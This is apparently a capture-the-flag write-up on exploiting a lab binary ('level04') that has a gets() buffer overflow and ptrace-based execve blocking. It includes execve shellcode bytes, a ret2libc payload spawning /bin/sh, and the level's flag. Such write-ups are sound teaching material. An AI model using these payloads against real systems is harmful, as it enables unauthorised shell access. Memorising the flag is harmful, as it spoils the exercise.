# level 4 Buffer Overflow Attack, Return-to-libc

## Overview
The binary has `gets` function which has vulnerability of `buffer overflow`. But there is also tracking system using `ptrace`, prevent running execve function in child process. Instead, we can use `return-to-libc` to go into the `libc` and run `system` with `/bin/sh`.

## Steps

### vulnerability with `gets`

address of argument of gets: `%esp+0x20` = `0xffffd630`\
address of return address: `%ebp+0x4` = `0xffffd6cc`\
offset = 156 bytes

We tried to write shellcode in the buffer and access there.
```
python -c '''
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = "x"*(156-len(shellcode))
address = "\xff\xff\xd6\x30"[::-1]
print shellcode + padding + address
''' > /tmp/04

(gdb) r <<< $(cat /tmp/04)
Starting program: /home/users/level04/level04 <<< $(cat /tmp/04)
Give me some shellcode, k
no exec() for you
[Inferior 1 (process 2007) exited normally]
```
This doesn't work because the parent is checking if child use `execve` and block it. 
```c
// child
prctl(1, 1);
ptrace(0, 0, 0, 0);
puts("Give me some shellcode, k");
gets(v5);

// parent
do
{
  wait(&v4);
  v6 = v4;
  if ( (v6 & 0x7F) == 0 || (v7 = v4, (char)((v4 & 0x7F) + 1) >> 1 > 0) )
  {
    puts("child is exiting...");
    return 0;
  }
  v8 = ptrace(3, v9, 44, 0);
}
while ( v8 != 11 );
puts("no exec() for you");
kill(v9, 9);
```
- `prctl(1, 1)` sets the process to receive a SIGHUP signal if its parent process dies.
- `ptrace(PTRACE_TRACEME, 0, 0, 0)` declares that the current process should be traced by its parent.

- `v8 = ptrace(3, v9, 44, 0)` with `PTRACE_PEEKUSER` as first argument, reads data from the child process's user area.
- `while ( v8 != 11 )` The number 11 signifies the system call number for `execve`, indicating its role in monitoring whether a child process has executed `execve`.

[Playing with ptrace](https://www.linuxjournal.com/article/6100)\
[ptrace.h](https://sites.uclouvain.be/SystInfo/usr/include/sys/ptrace.h.html)\
[Exploiting Linux systems with ptrace](https://raj3shp.medium.com/exploiting-linux-systems-with-ptrace-637f13a7d9ea)\
[Intercepting and Emulating Linux System Calls with Ptrace](https://nullprogram.com/blog/2018/06/23/)

#### Tip! 
to debug multi-process program
```
(gdb) set follow-fork-mode child
(gdb) set follow-fork-mode parent
```

### return-to-libc

1. `EIP` is overwritten with address of the `system()` function located inside `libc`
2. Right after the address of `system()`, there's address of the function `exit()`, so that once `system()` returns, the vulnerable program jumps the `exit()`, which also lives in the libc, so that the vulnerable program can exit gracefully;
3. Right after the address of `exit()`, there's a pointer to a memory location that contains the string /bin/sh, which is the argument we want to pass to the `system()` function.

```
(gdb) info proc map
Start Addr   End Addr       Size     Offset objfile
 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
0xf7e2b000 0xf7e2c000     0x1000        0x0
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
0xf7fd0000 0xf7fd4000     0x4000        0x0
0xf7fda000 0xf7fdb000     0x1000        0x0
```
There is `/lib32/libc-2.15.so` from `0xf7e2c000` to `0xf7fcc000`.

```
(gdb) find 0xf7e2c000, 0xf7fcc000, /bin/sh
0xf7f897ec
1 pattern found.
```
-> address of string "/bin/sh" = `0xf7f897ec`
```
objdump -d /lib32/libc-2.15.so | grep system
0003eed0 <__libc_system>:

readelf -s /lib32/libc-2.15.so | grep system
   239: 0011ca50    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   615: 0003eed0   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1422: 0003eed0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```
-> address of `system` = `0xf7e2c000` + `0003eed0` = `0xf7e6aed0`


[Return-to-libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)



## Payload
address of `system` = `0xf7e6aed0`\
address of string, `/bin/sh` = `0xf7f897ec`\
I just keep place for exit with dummy data. haha
```
python -c 'print("x"*156 + "\xf7\xe6\xae\xd0"[::-1] + "xxxx" + "\xf7\xf8\x97\xec"[::-1])' > /tmp/04

cat /tmp/04 - | ./level04
```

## Flag
```
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```